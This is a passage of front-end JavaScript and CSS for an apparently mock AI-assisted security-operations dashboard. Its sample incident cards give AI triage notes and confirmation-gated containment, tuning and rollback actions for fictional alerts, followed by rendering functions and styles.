  'day-auto1':{score:0, note:`Dark Watch removed a mailbox exfil rule on <b>j.reyes</b> and closed the case — resolved autonomously, full evidence trail in the record.`},
  'day-auto2':{score:0, note:`Dark Watch blocked a VPN password spray from 14 botnet IPs at the edge — 0 successful logins, block auto-expires in 24h.`},
  'day-r3':{score:94, note:`MFA was satisfied from <b>two countries in 40 minutes</b> — that reads as a stolen session token, not a guessed password. The CFO's live sessions are the blast radius. I'd start here.`, chips:['cfo@corp','okta-sso','MFA satisfied · 2 geos','session token'], actions:[
    {label:'Revoke active sessions',icon:'lock',gated:true,confirm:`Revoke every live session for cfo@corp across Okta and Microsoft 365. The CFO is signed out on all devices immediately.`,done:`Sessions revoked — 3 active tokens killed across Okta + M365.`,sub:'cfo@corp',cta:'Revoke sessions',tone:'danger',permNote:'identity actions permitted',blast:[['user','Kills <b>3 active sessions</b> for cfo@corp'],['lock','Forces re-auth across <b>Okta + M365</b>'],['warn','The CFO is signed out on <b>every device</b>'],['doc','Removes the <b>09:43 forwarding rule</b>'],['refresh','<b>Reversible</b> — they simply sign back in','ok']]},
    {label:'Attach latest evidence',icon:'doc',done:`Token lineage and sign-in evidence attached to CASE-2047.`},
    {label:'Force password + MFA reset',icon:'shield',gated:true,confirm:`Force a password reset and re-enroll MFA for cfo@corp at next sign-in.`,done:`Reset enforced — cfo@corp must re-enroll MFA at next sign-in.`,sub:'cfo@corp',cta:'Force reset',tone:'danger',permNote:'identity actions permitted',blast:[['lock','Expires the current password for <b>cfo@corp</b>'],['shield','Requires <b>MFA re-enrollment</b> at next sign-in'],['warn','Blocks access until the reset completes'],['refresh','<b>Reversible</b> — an admin can clear it','ok']]}]},
  'day-r5':{score:89, note:`Overnight encryption on the <b>Sales NAS</b> — 1,431 files renamed in four minutes before the writing process died. Spread stayed local to one share; isolate the share before restoring from snapshot.`, chips:['Sales-NAS','ransomware','1.4k files','4 min'], actions:[
    {label:'Isolate Sales-NAS',icon:'lock',gated:true,twoPerson:'maya',confirm:`Cut Sales-NAS off the network so nothing touches the share before restore. Active file shares will drop for users.`,done:`Sales-NAS isolated — share offline; restore from SNAP-7740 can begin.`,sub:'Sales-NAS',cta:'Confirm isolation',tone:'danger',permNote:'host isolation permitted',blast:[['host','Isolates <b>Sales-NAS</b> from the network'],['network','<b>Active file shares</b> drop for users'],['shield','SOC + backup tooling retain access','ok'],['refresh','<b>Reversible</b> — one click to restore','ok']]},
    {label:'Snapshot for forensics',icon:'doc',done:`Volume snapshot captured (SNAP-7741) — preserved for forensics.`},
    {label:'Sweep FIN-WS-22 for persistence',icon:'terminal',done:`Persistence sweep complete — one scheduled task removed, no other footholds on FIN-WS-22.`}]},
  'day-r6':{score:82, note:`<b>svc-helpdesk</b> was added to <b>Domain Admins</b> at 02:43, inside the FIN-WS-04 attack window — no change ticket. The morning sweep surfaced it 11 minutes ago.`, chips:['svc-helpdesk','Domain Admins','no change ticket'], actions:[
    {label:'Remove from Domain Admins',icon:'lock',gated:true,confirm:`Remove svc-helpdesk from Domain Admins, reverting the unauthorized elevation.`,done:`svc-helpdesk removed from Domain Admins — membership reverted.`,sub:'svc-helpdesk',cta:'Remove access',tone:'danger',permNote:'identity actions permitted',blast:[['userx','Removes <b>svc-helpdesk</b> from Domain Admins'],['shield','Reverts the unauthorized elevation'],['warn','Tasks relying on it lose admin rights'],['refresh','<b>Reversible</b> — re-add if legitimate','ok']]},
    {label:'Trace who made the change',icon:'terminal',done:`Traced to FIN-WS-04 via the same svc-backup session at 02:43 UTC.`}]},
  'day-r7':{score:74, note:`A <b>4.2 GB</b> archive was assembled in <code>C:\\temp</code> on <b>FIN-DB-02</b> from finance exports. Nothing's left the host yet — staged, not exfiltrated.`, chips:['FIN-DB-02','4.2 GB','staged','no egress'], actions:[
    {label:'Block egress on FIN-DB-02',icon:'lock',gated:true,confirm:`Apply an egress block on FIN-DB-02 so the staged archive can't leave while you investigate. The host stays reachable for IR.`,done:`Egress blocked on FIN-DB-02 — outbound denied, host reachable for IR.`,sub:'FIN-DB-02',cta:'Block egress',tone:'danger',permNote:'network actions permitted',blast:[['network','Denies <b>all outbound</b> from FIN-DB-02'],['db','Staged <b>4.2 GB archive</b> can no longer leave'],['shield','Host stays reachable for IR','ok'],['refresh','<b>Reversible</b> — lift after triage','ok']]},
    {label:'Quarantine the archive',icon:'doc',gated:true,confirm:`Move the 4.2 GB staged archive to quarantine and hash it.`,done:`Archive quarantined and hashed — SHA-256 logged to the case.`,sub:'FIN-DB-02',cta:'Quarantine',tone:'danger',permNote:'evidence handling permitted',blast:[['doc','Moves the <b>4.2 GB archive</b> to quarantine'],['lock','Hashes it (SHA-256) and logs to the case'],['shield','Preserves chain of custody','ok']]}]},
  'day-r8':{score:66, victims:['m.chen@corp','r.patel@corp','s.okafor@corp','t.nguyen@corp','a.rossi@corp','k.silva@corp','d.kim@corp','l.brown@corp','p.alvarez@corp','j.muller@corp','n.haddad@corp','e.olsen@corp','c.dubois@corp','w.zhang@corp','b.adeyemi@corp','f.costa@corp','g.ivanov@corp','h.tanaka@corp'], note:`A live <b>credential-harvest page</b> branded as the Okta login is being clicked by <b>18 users</b> — the latest page in this week's wave. No submissions confirmed on this page yet.`, chips:['18 users','okta look-alike','live page'], actions:[
    {label:'Block the URL fleet-wide',icon:'lock',gated:true,confirm:`Sinkhole the phishing URL across the proxy and email gateway.`,done:`URL blocked fleet-wide — 18 users can no longer reach the page.`,sub:'okta-login[.]co',cta:'Block URL',tone:'danger',permNote:'web & email actions permitted',blast:[['network','Sinkholes the URL on <b>proxy + email gateway</b>'],['users','<b>18 users</b> can no longer reach the page'],['shield','No impact to the legitimate Okta','ok'],['refresh','<b>Reversible</b> — remove from blocklist','ok']]},
    {label:'Pull who clicked',icon:'list',done:`18 clickers identified — 0 credential submissions on this page so far.`}]},
  'day-r4':{score:58, note:`Consent's already revoked. Tom is reading the access logs to confirm nothing was pulled in the ~3 days the app held <code>mailbox.read</code>.`, chips:['jdoe@corp','OAuth app','mailbox.read','consent revoked'], actions:[
    {label:'Take over',icon:'arrow',done:`You're now the owner of CASE-2039 — Tom has been notified.`}]},
  'day-m1':{score:55, note:`Isolating <b>FIN-WS-22</b> — the workstation behind the Sales-NAS encryption, kicked off at shift start. Policy propagating (step 3 of 4). ETA under a minute.`, chips:['FIN-WS-22','isolating','3 / 4'], progress:74, stepsTotal:4, stepNow:3, progressLabel:'Step 3 of 4 · ETA under a minute', steps:[{label:'Snapshot live connections on FIN-WS-22',state:'done',t:'2m ago'},{label:'Apply isolation policy — EDR + switch ACLs',state:'done',t:'1m ago'},{label:'Propagate policy to enforcement points',state:'run',t:'18 of 24 nodes'},{label:'Verify isolation — probe from 3 vantage points',state:'todo'}], actions:[
    {label:'Cancel isolation',icon:'x',gated:true,confirm:`Stop isolating FIN-WS-22 and roll back the containment policy.`,done:`Isolation cancelled — FIN-WS-22 back on the network.`,sub:'FIN-WS-22',cta:'Cancel isolation',tone:'danger',permNote:'host isolation permitted',blast:[['refresh','Rolls back the containment policy on <b>FIN-WS-22</b>'],['warn','Host rejoins the network — <b>exposure resumes</b>'],['network','3 dependencies regain reachability']]}]},
  'day-m2':{score:52, note:`Revoking sessions across the <b>j.reyes</b> blast radius — the precaution from CASE-2043 — 2 of 5 downstream apps done.`, chips:['j.reyes@corp','5 apps','2 / 5'], progress:40, stepsTotal:5, stepNow:2, progressLabel:'2 of 5 apps', steps:[{label:'Okta — 3 sessions revoked',state:'done',t:'3m ago'},{label:'Microsoft 365 — 2 sessions revoked',state:'done',t:'1m ago'},{label:'Salesforce — revoking 1 session',state:'run',t:'now'},{label:'NetSuite',state:'todo'},{label:'Slack',state:'todo'}], actions:[
    {label:'Pause sweep',icon:'pause',done:`Sweep paused at 2 / 5 — resume anytime.`}]},
  'day-r2':{score:46, note:`The <b>“Unusual port for process”</b> rule fired <b>1,240×</b> in 24h — every hit traces to the authorized <b>Qualys</b> scanner sweeping the DMZ. Zero analyst-confirmed true positives in 30 days.`, chips:['rule: unusual-port','1,240 / day','Qualys scanner','0 true positives'], actions:[
    {label:'Review tuning',icon:'settings',gated:true,cta:'Apply with monitoring',tone:'act',sub:'Rule · Unusual port for process',permNote:'detection tuning permitted',
      done:`Exception applied — scanner traffic suppressed, 14-day monitoring on, auto-expires in 30 days.`,
      review:{type:'tuning', rule:'Unusual port for process',
        examples:[['FIN-DMZ-01','qualys-scan','tcp/9443','benign · scanner'],['FIN-DMZ-02','qualys-scan','tcp/8089','benign · scanner'],['WEB-DMZ-04','qualys-scan','tcp/5986','benign · scanner']],
        before:1240, after:18, fpReduction:'~98%',
        scope:'process.name:"qualys-scan" AND host.name:DMZ-scan-pool',
        caveats:['Scoped to the scanner account on DMZ hosts only — these ports still alert everywhere else.','Adds a monitored exception; the rule logic is left unchanged.'],
        monitorWindow:'14 days', expiration:'Auto-expires in 30 days', rollback:'One-click rollback — suppressed alerts retained, not deleted.'},
      blast:[['eyeoff','Suppresses the rule for <b>qualys-scan</b> on the DMZ pool only'],['shield','Every other host & account still alerts','ok'],['eye','<b>14-day monitoring</b> flags any missed true positive','ok'],['refresh','<b>Reversible</b> — remove the exception anytime','ok']]},
    {label:'Send to detection engineer',icon:'arrow',done:`Routed to detection engineering with matched examples and the volume estimate attached.`}]},
  'day-w1':{score:28, note:`Low-confidence beaconing from one host to <code>91.242.x.x</code> — weak periodicity, tiny volume. Watching for a second hit before I act.`, chips:['1 host','91.242.x.x']},
  'day-w2':{score:18, note:`Three contractors signed in via VPN outside their usual hours. All MFA-clean, from known devices — flagging, not escalating.`, chips:['VPN','3 contractors','MFA clean']},
  'day-w3':{score:12, note:`A new OAuth app ("SheetSync") requested read-only scopes and is pending publisher verification. No grants yet — unrelated to CASE-2039.`, chips:['OAuth','read-only','pending']},
  'day-amb2':{score:0, note:`Chased the NXDOMAIN spike to a misconfigured thermostat on the guest VLAN. <b>Not exfil</b> — loop closed, nothing for you.`},
  'day-amb1':{score:0, note:`Invoice-phish against 4 Finance users. One credential submitted, password reset enforced, no follow-on. Maya closed it.`},
  'day-r1':{score:0, note:`Ransomware on the Sales file server — host isolated in 6 minutes, zero spread. Restored from snapshot.`},
  'night-1':{score:95, note:`Checkout p99 jumped <b>+340ms</b>. I root-caused it to the <b>v2.8.1</b> deploy and staged the rollback — it just needs your sign-off to run.`, chips:['checkout','deploy v2.8.1','rollback staged','SLO breached'], actions:[
    {label:'Execute rollback to v2.8.0',icon:'rotate',gated:true,confirm:`Roll checkout-service back to v2.8.0 in production. Expect a brief 5xx blip during the swap.`,done:`Rollback executed — checkout-service on v2.8.0, p99 recovering toward 180ms.`,sub:'checkout-service → v2.8.0',cta:'Approve rollback',tone:'act',permNote:'deploy rollback permitted',blast:[['deploy','Rolls <b>checkout-service</b> back to <b>v2.8.0</b>'],['host','<b>3 pods</b> rolling restart'],['shield','<b>No schema change</b> — data-safe','ok'],['clock','Est. recovery <b>~90s</b>; p99 → ~180ms','ok']]},
    {label:'Open the investigation',icon:'investigation',done:`INV-NS-77 opened with the trace diff and deploy correlation attached.`}]},
  'night-r4':{score:86, note:`The 30-day error budget for <b>search-api</b> is <b>96% spent</b> — at the current <b>4× burn</b> it exhausts within the hour.`, chips:['search-api','budget 96% spent','4× burn'], actions:[
    {label:'Freeze deploys',icon:'lock',gated:true,confirm:`Apply a deploy freeze on search-api until the error budget recovers. The pipeline will be gated.`,done:`Deploy freeze applied to search-api — pipeline gated.`,sub:'search-api',cta:'Freeze deploys',tone:'act',permNote:'pipeline controls permitted',blast:[['lock','Gates the <b>search-api</b> deploy pipeline'],['warn','Pending releases are <b>held</b>'],['shield','Protects the remaining error budget','ok'],['refresh','<b>Reversible</b> — lift when recovered','ok']]},
    {label:'Page the on-call',icon:'bolt',gated:true,confirm:`Page the search-api on-call engineer now.`,done:`Paged — on-call acknowledged in 40s.`,sub:'search-api on-call',cta:'Page on-call',tone:'act',permNote:'paging permitted',blast:[['bolt','Pages the <b>search-api on-call</b> engineer'],['users','Opens a PagerDuty incident'],['clock','Escalates if unacked in <b>5 min</b>']]}]},
  'night-r5':{score:78, note:`Timeouts in <b>cart</b> are cascading into <b>inventory</b> — retry storms are amplifying load. Three services degraded.`, chips:['cart','inventory','retry storm'], actions:[
    {label:'Shed load at the edge',icon:'lock',gated:true,confirm:`Enable load-shedding at the gateway for cart traffic to break the retry storm.`,done:`Load-shedding on — cart errors dropping, inventory recovering.`,sub:'gateway · cart',cta:'Shed load',tone:'act',permNote:'traffic controls permitted',blast:[['network','Sheds a share of <b>cart</b> traffic at the gateway'],['warn','Some users see <b>503s</b> briefly'],['shield','Breaks the retry storm; inventory recovers','ok'],['refresh','<b>Reversible</b> — disable when stable','ok']]},
    {label:'Trace the dependency chain',icon:'terminal',done:`Chain traced: cart → inventory → pricing. Pricing is the slow tail.`}]},
  'night-r6':{score:70, note:`The TLS cert on the <b>payments gateway</b> expires in <b>5 hours</b>. Auto-renew failed twice on an ACME challenge error.`, chips:['payments-gw','5h to expiry','renew failed'], actions:[
    {label:'Force cert renewal',icon:'rotate',gated:true,confirm:`Retry the ACME renewal for the payments gateway using the DNS-01 challenge.`,done:`Cert renewed — valid 90 days, gateway reloaded.`,sub:'payments gateway',cta:'Renew cert',tone:'act',permNote:'cert management permitted',blast:[['rotate','Retries ACME via the <b>DNS-01</b> challenge'],['shield','Reloads the gateway with the new cert','ok'],['clock','Completes in <b>~30s</b>','ok']]},
    {label:'Show the renewal logs',icon:'doc',done:`ACME logs: HTTP-01 challenge blocked by the WAF — DNS-01 will succeed.`}]},
  'night-r7':{score:62, note:`<b>recommendation-svc</b> pods are in an <b>OOMKill loop</b> — 6 restarts in 10 minutes. Memory limit looks too low for the new model.`, chips:['recommendation-svc','OOMKill','6 restarts'], actions:[
    {label:'Raise the memory limit',icon:'lock',gated:true,confirm:`Bump recommendation-svc memory 512Mi → 1Gi and roll the deployment.`,done:`Limit raised to 1Gi — pods stable, no restarts in 3 min.`,sub:'recommendation-svc',cta:'Raise limit',tone:'act',permNote:'workload changes permitted',blast:[['deploy','Bumps memory <b>512Mi → 1Gi</b>'],['host','Rolling restart of the deployment'],['clock','Breaks the OOMKill loop','ok']]},
    {label:'Roll back the model',icon:'rotate',gated:true,confirm:`Revert recommendation-svc to the previous model build.`,done:`Model rolled back — memory footprint back to baseline.`,sub:'recommendation-svc',cta:'Roll back model',tone:'act',permNote:'deploy rollback permitted',blast:[['rotate','Reverts to the <b>previous model build</b>'],['host','Rolling restart','ok'],['shield','Memory footprint returns to baseline','ok']]}]},
  'night-r1':{score:70, note:`payments-api 5xx climbed to 4% after a 01:48 config push. I've correlated the change and staged a revert — it's validating now.`, chips:['payments-api','5xx · 4%','config push 01:48','revert staged'], actions:[
    {label:'Approve the revert',icon:'check',gated:true,confirm:`Approve and apply the staged config revert on payments-api.`,done:`Revert approved and applied — 5xx dropping from 4%.`,sub:'payments-api',cta:'Approve revert',tone:'act',permNote:'config changes permitted',blast:[['rotate','Applies the staged <b>config revert</b> on payments-api'],['shield','Undoes the 01:48 push','ok'],['clock','5xx drops from <b>4%</b>','ok']]}]},
  'night-m1':{score:48, note:`Scaling <b>checkout</b> pods 6 → 14 to absorb the load. 11 ready, 3 pending.`, chips:['checkout','6 → 14','11 ready'], progress:78, actions:[
    {label:'Cap at current',icon:'pause',done:`Scaling capped at 11 pods — autoscaler held.`}]},
  'night-m2':{score:44, note:`Draining and restarting the lagging <b>kafka</b> consumer group — lag down from 2.1M to 480k.`, chips:['kafka','lag 480k','draining'], progress:55, actions:[
    {label:'Take over',icon:'arrow',done:`You're now driving the kafka remediation — NightShift will assist.`}]},
  'night-w1':{score:36, note:`Elevated GC pauses on <b>ingest-worker</b> (p99 220ms) — within tolerance but trending up. Watching the heap.`, chips:['ingest-worker','GC p99 220ms']},
  'night-w2':{score:26, note:`Logs volume in <b>eu-central-1</b> at 71% and climbing slowly. Days of headroom — flagging early.`, chips:['eu-central-1','logs 71%']},
  'night-w3':{score:16, note:`The <b>eu-west</b> read replica fails its healthcheck intermittently (3 in an hour). No query impact yet.`, chips:['eu-west','replica','3 / hr']},
  'night-r2':{score:0, note:`kafka-broker-3 hit 92% disk. Expired stale segments, expanded the volume. Stable since.`},
  'night-r3':{score:0, note:`eu-west-1 degraded; traffic failed over to eu-central-1 with no customer impact. Upstream provider outage. Maya closed it.`},
  'night-amb1':{score:0, note:`Heap growth on ingest-worker traced to an unbounded cache in v4.2. The TTL fix you approved at 03:40 held — heap's flat.`},
};
/* ---- Decision-type taxonomy: how the proposals are grouped ---- */
const DECISION_META = {
  contain:    {label:'Contain',    color:'var(--red)',    icon:'lock',     blurb:'Stop the spread now'},
  escalate:   {label:'Escalate',   color:'#d4791a',       icon:'arrow',    blurb:'Raise for incident response'},
  investigate:{label:'Investigate',color:'var(--blue)',   icon:'search',   blurb:'Confirm scope before acting'},
  tune:       {label:'Tune',       color:'var(--violet)', icon:'settings', blurb:'Adjust a rule or limit'},
  suppress:   {label:'Suppress',   color:'var(--ink-3)',  icon:'eyeoff',   blurb:'Known-good — quiet the alert'},
  monitor:    {label:'Monitor',    color:'var(--ink-3)',  icon:'eye',      blurb:'Watching — no action yet'},
  dismiss:    {label:'Dismiss',    color:'var(--ink-4)',  icon:'check',    blurb:'Closed — no action needed'},
};
const DECISION_ORDER = ['contain','escalate','investigate','tune','suppress','monitor','dismiss'];
const ACTIVE_DECS  = ['contain','escalate','investigate','tune'];   // proposals awaiting a decision → full cards
const PASSIVE_DECS = ['suppress','monitor','dismiss'];              // no action needed → condensed rows
const DECISION_BY_ID = {
  // DAYSHIFT
  'day-auto1':'contain','day-r3':'contain','day-r5':'contain','day-r6':'contain','day-m1':'contain','day-m2':'contain',
  'day-r7':'escalate','day-r8':'escalate',
  'day-r4':'investigate',
  'day-r2':'tune',
  'day-w2':'suppress',
  'day-w1':'monitor','day-w3':'monitor',
  'day-amb1':'dismiss','day-amb2':'dismiss','day-r1':'dismiss',
  // NIGHTSHIFT
  'night-1':'contain','night-r5':'contain','night-r6':'contain','night-r1':'contain','night-m1':'contain','night-m2':'contain',
  'night-r4':'escalate',
  'night-r7':'tune',
  'night-w1':'monitor','night-w2':'monitor','night-w3':'monitor',
  'night-r2':'dismiss','night-r3':'dismiss','night-amb1':'dismiss',
};
function decisionOf(t){
  if(state.decisionOverride && state.decisionOverride[t.id]) return state.decisionOverride[t.id];
  return DECISION_BY_ID[t.id] || (radarScore(t)===0 || t.status==='resolved' ? 'dismiss' : 'monitor');
}
function radarTier(t){
  if(t.status==='in-progress') return 'motion';
  if(t.status==='open'||t.status==='awaiting') return radarScore(t)>=50 ? 'now' : 'watch';
  return 'done';
}
function radarScore(t){ return AI_RADAR[t.id] ? AI_RADAR[t.id].score : 0; }
function radarGreeting(){
  const h=new Date().getHours();
  const g = h<12 ? 'Good morning' : h<18 ? 'Good afternoon' : 'Good evening';
  const wd = new Date().toLocaleDateString(undefined,{weekday:'long', month:'short', day:'numeric'});
  return {g, wd};
}
function radarWho(t){ return t.owner==='nightshift' ? 'NightShift' : (PEOPLE[t.owner] ? PEOPLE[t.owner].name : 'You'); }
function radarPrio(score){
  if(score>=80) return {label:'Act now', cls:'crit'};
  if(score>=50) return {label:'Review', cls:'high'};
  if(score>0)   return {label:'FYI', cls:'low'};
  return {label:'Done', cls:'done'};
}
function radarSevColor(t){
  if(t.status==='resolved') return 'var(--green)';
  if(t.severity && SEV[t.severity]) return SEV[t.severity].c;
  const p=radarPrio(AI_RADAR[t.id]?AI_RADAR[t.id].score:0);
  return p.cls==='crit'?'var(--red)':p.cls==='high'?'var(--amber)':'var(--blue)';
}
function radarMetaLine(t){
  const m=TYPE_META[t.type]||{}; const who=radarWho(t);
  return `${m.label||t.type}${who?` · ${who}`:''}`;
}
function radarGauge(score, cls, feat, colorOverride){
  const size = feat ? 42 : 38, sw = feat ? 4 : 3.5, r=(size-sw)/2, c=2*Math.PI*r, off=c*(1-Math.max(0,Math.min(100,score))/100);
  const col = colorOverride || (cls==='crit'?'var(--red-d)':cls==='high'?'var(--amber)':cls==='low'?'var(--ink-3)':'var(--ink-3)');
  return `<span class="rad-gauge${feat?' feat':''}" title="${score}/100">
    <svg width="${size}" height="${size}" viewBox="0 0 ${size} ${size}">
      <circle cx="${size/2}" cy="${size/2}" r="${r}" fill="none" stroke="var(--line)" stroke-width="${sw}"/>
      <circle cx="${size/2}" cy="${size/2}" r="${r}" fill="none" stroke="${col}" stroke-width="${sw}" stroke-linecap="round" stroke-dasharray="${c.toFixed(2)}" stroke-dashoffset="${off.toFixed(2)}" transform="rotate(-90 ${size/2} ${size/2})"/>
    </svg>
    <b style="color:${col}">${score}</b>
  </span>`;
}
function radarItem(t, done){
  const m=TYPE_META[t.type]||{}; const ai=AI_RADAR[t.id]||{score:0,note:t.narrative||''};
  const typeColor = m.color || 'var(--ink-3)';
  const prio=radarPrio(ai.score);
  const idTag = t.recordId ? `<span class="rad-id">${t.recordId}</span>` : '';
  const sevTag = t.severity ? `<span class="rad-sevlabel ${prio.cls}">${t.severity} severity</span>` : '';
  const chips=(ai.chips||[]).map(c=>`<span class="rad-chip">${c}</span>`).join('');
  const sc=radarSevColor(t);
  return `<div class="rad-item rad-item-hdr" style="--sev:${sc}" onclick="App.openThread('${t.id}')">
    <div class="rad-hdr">
      <span class="rad-tag ${prio.cls}">${prio.label}</span>
      ${sevTag}
      ${ai.score?radarGauge(ai.score, prio.cls, false):''}
    </div>
    <div class="rad-item-main">
      <span class="rad-ic" style="--tc:${sc}">${ic(m.icon||'layers',16)}</span>
      <div class="rad-body">
        <div class="rad-titlerow"><span class="rad-title">${t.title}</span>${idTag}</div>
        <div class="rad-ai">${ai.note}</div>
        ${chips?`<div class="rad-chips">${chips}</div>`:''}
      </div>
      ${t.updated?`<span class="rad-when">${t.updated}</span>`:''}
    </div>
  </div>`;
}
function radarDoneItem(t){
  const m=TYPE_META[t.type]||{};
  const when=t.updated||'resolved';
  const idTag = t.recordId ? `<span class="rad-id">${t.recordId}</span>` : '';
  return `<div class="rad-done" onclick="App.openThread('${t.id}')">
    <span class="rad-done-ic">${ic('check',12)}</span>
    <span class="rad-done-t">${t.title}</span>
    ${idTag}
    <span class="rad-done-when">${when}</span>
  </div>`;
}
function radarCompactItem(t){
  const m=TYPE_META[t.type]||{};
  const ai=AI_RADAR[t.id]||{};
  const prio=radarPrio(ai.score||0);
  const sc=radarSevColor(t);
  const when=t.updated||'';
  const idTag = t.recordId ? `<span class="rad-id">${t.recordId}</span>` : '';
  return `<div class="rad-done rad-compact" onclick="App.openThread('${t.id}')">
    <span class="rad-done-ic" style="--tc:${sc}">${ic(m.icon||'layers',12)}</span>
    <span class="rad-done-t">${t.title}</span>
    ${idTag}
    <span class="rad-compact-tag ${prio.cls}">${prio.label}</span>
    ${when?`<span class="rad-done-when">${when}</span>`:''}
  </div>`;
}
function radarFeatured(t){
  const m=TYPE_META[t.type]||{}; const ai=AI_RADAR[t.id]||{score:0,note:''};
  const typeColor = m.color || 'var(--ink-3)';
  const idTag=t.recordId?`<span class="rad-id">${t.recordId}</span>`:'';
  const chips=(ai.chips||[]).map(c=>`<span class="rad-chip">${c}</span>`).join('');
  return `<div class="rad-item rad-feat" onclick="App.openThread('${t.id}')">
    <div class="rad-feat-tagrow"><span class="rad-feat-tag">${ic('sparkle',12)} Top priority</span>${t.severity?`<span class="rad-feat-sev">${t.severity} severity</span>`:''}${ai.score?radarGauge(ai.score, 'crit', true):''}</div>
    <div class="rad-feat-main">
      <span class="rad-ic" style="--tc:var(--red-d)">${ic(m.icon||'layers',16)}</span>
      <div class="rad-body">
        <div class="rad-titlerow"><span class="rad-title rad-feat-title">${t.title}</span>${idTag}</div>
        <div class="rad-ai rad-feat-ai">${ai.note}</div>
        ${chips?`<div class="rad-chips">${chips}</div>`:''}
      </div>
      ${t.updated?`<span class="rad-when rad-feat-when">${t.updated}</span>`:''}
    </div>
  </div>`;
}
/* ---- Brief cards with on-card recommended actions (confirm + open-in-chat) ---- */
function loopCss(){ return `
/* ===== Proposal review (tuning / detection) ===== */
.pr{display:flex;flex-direction:column;gap:12px;margin:0 0 4px}
.pr-sec{display:flex;flex-direction:column;gap:6px}
.pr-h{display:flex;align-items:center;gap:6px;font-size:11px;font-weight:600;color:var(--ink-2);letter-spacing:.01em;text-transform:none}
.pr-h svg{color:var(--ink-4)}
.pr-n{margin-left:auto;font-weight:500;color:var(--ink-4);font-size:10.5px}
.pr-ex{width:100%;border-collapse:collapse;font-size:11px}
.pr-ex th{text-align:left;font-weight:500;color:var(--ink-4);padding:3px 8px;border-bottom:1px solid var(--line)}
.pr-ex td{padding:4px 8px;border-bottom:1px solid var(--line);color:var(--ink-2)}
.pr-ex tr:last-child td{border-bottom:none}
.pr-benign{color:var(--green);font-weight:500;font-size:10.5px}
.pr-risky{color:var(--red-d);font-weight:500;font-size:10.5px}
.pr-vol{display:flex;flex-direction:column;gap:5px}
.pr-vrow{display:flex;align-items:center;gap:9px}
.pr-vl{width:42px;font-size:10.5px;color:var(--ink-4)}
.pr-vbar{flex:1;height:8px;border-radius:999px;background:var(--bg-2);overflow:hidden}
.pr-vbar i{display:block;height:100%;border-radius:999px}
.pr-vbar i.b{background:var(--red)}
.pr-vbar i.a{background:var(--green)}
.pr-vv{width:66px;text-align:right;font-size:11px;font-weight:600;font-family:var(--mono);color:var(--ink-2)}
.pr-fp{font-size:11px;color:var(--green);display:flex;align-items:center;gap:5px;font-weight:500}
.pr-scope{display:block;font-family:var(--mono);font-size:11px;background:var(--bg-2);border:1px solid var(--line);border-radius:var(--r-sm);padding:6px 8px;color:var(--ink-1);word-break:break-word}
.pr-cav{margin:0;padding-left:16px;font-size:11px;color:var(--ink-2);display:flex;flex-direction:column;gap:3px}
.pr-meta{display:flex;flex-wrap:wrap;gap:6px;margin-top:1px}
.pr-chip{display:inline-flex;align-items:center;gap:5px;font-size:10.5px;font-weight:500;color:var(--ink-2);background:var(--bg-2);border:1px solid var(--line);border-radius:999px;padding:4px 9px}
.pr-chip.ok{color:var(--green);border-color:color-mix(in srgb,var(--green) 26%,var(--line))}
.pr-chip svg{color:var(--ink-4)}
.pr-chip.ok svg{color:var(--green)}
.pr-diff{font-family:var(--mono);font-size:11px;border:1px solid var(--line);border-radius:var(--r-sm);overflow:hidden;line-height:1.55}
.pr-diff div{padding:2px 9px;white-space:pre-wrap}
.pr-diff .add{background:var(--green-bg);color:var(--green)}
.pr-diff .del{background:var(--red-bg);color:var(--red-d)}
.pr-diff .ctx{color:var(--ink-3)}
.pr-code{font-family:var(--mono);font-size:11px;line-height:1.7;background:var(--bg-2);border:1px solid var(--line);border-radius:var(--r-sm);padding:9px 11px;color:var(--ink-1);overflow-x:auto}
.pr-code>div{white-space:pre}
.pr-code .k{color:var(--ink-4)}
.pr-bt{display:flex;gap:18px;flex-wrap:wrap}
.pr-bt .bt{display:flex;flex-direction:column}
.pr-bt .bt-v{font-size:17px;font-weight:700;font-family:var(--mono);color:var(--ink-1);letter-spacing:-.01em}
.pr-bt .bt-v.amber{color:var(--amber)}
.pr-bt .bt-v.green{color:var(--green)}
.pr-bt .bt-k{font-size:10px;color:var(--ink-4);margin-top:1px}
/* ===== Performance dashboard ===== */
.perf-stats{display:grid;grid-template-columns:repeat(3,1fr);gap:10px;margin-bottom:18px}
.perf-stat{background:var(--panel);border:1px solid var(--line);border-radius:var(--r-md);padding:13px 15px}
.perf-stat .ps-v{font-size:25px;font-weight:700;letter-spacing:-.02em;color:var(--ink-0);font-family:var(--mono)}
.perf-stat .ps-v.green{color:var(--green)}
.perf-stat .ps-k{font-size:11.5px;color:var(--ink-3);margin-top:2px}
.perf-stat .ps-d{font-size:10.5px;color:var(--ink-4);margin-top:5px;display:flex;align-items:center;gap:4px}
.perf-stat .ps-d.up{color:var(--green)}
.perf-tbl{width:100%;border-collapse:collapse;font-size:12.5px}
.perf-tbl th{text-align:left;font-weight:500;color:var(--ink-4);padding:8px 10px;border-bottom:1px solid var(--line);font-size:11px}
.perf-tbl th.r,.perf-tbl td.r{text-align:right}
.perf-tbl td{padding:10px 10px;border-bottom:1px solid var(--line);color:var(--ink-1)}
.perf-tbl tr:last-child td{border-bottom:none}
.perf-flow{font-weight:550}
.perf-acc{display:flex;align-items:center;gap:8px}
.perf-accbar{width:74px;height:6px;border-radius:999px;background:var(--bg-2);overflow:hidden}
.perf-accbar i{display:block;height:100%;border-radius:999px;background:var(--green)}
.perf-callout{display:flex;gap:11px;align-items:flex-start;background:var(--blue-bg);border-radius:var(--r-md);padding:14px 16px;margin-top:18px}
.perf-callout .pc-ic{color:var(--blue);flex:0 0 auto;margin-top:1px}
.perf-callout .pc-b{flex:1;font-size:12.5px;color:var(--ink-1);line-height:1.55}
.perf-callout .pc-b b{color:var(--ink-0)}
.perf-callout .pc-btn{margin-top:9px}
.perf-rej{display:flex;flex-direction:column;gap:7px}
.perf-rejrow{display:flex;align-items:center;gap:10px;font-size:12px}
.perf-rejrow .rr-l{width:172px;color:var(--ink-2);flex:0 0 auto}
.perf-rejbar{flex:1;height:7px;border-radius:999px;background:var(--bg-2);overflow:hidden}
.perf-rejbar i{display:block;height:100%;border-radius:999px;background:var(--violet)}
.perf-rejrow .rr-n{width:26px;text-align:right;font-weight:600;color:var(--ink-2);font-family:var(--mono)}
/* ===== Threat hunt: NotDaybreak redesign ===== */
.huntx{max-width:none}
.hx-composer{display:flex;align-items:center;gap:11px;margin-top:2px;background:var(--panel);border:1px solid var(--line-2);border-radius:var(--r-md);padding:8px 8px 8px 14px;box-shadow:0 1px 2px rgba(20,23,28,.04);transition:border-color .15s,box-shadow .15s}
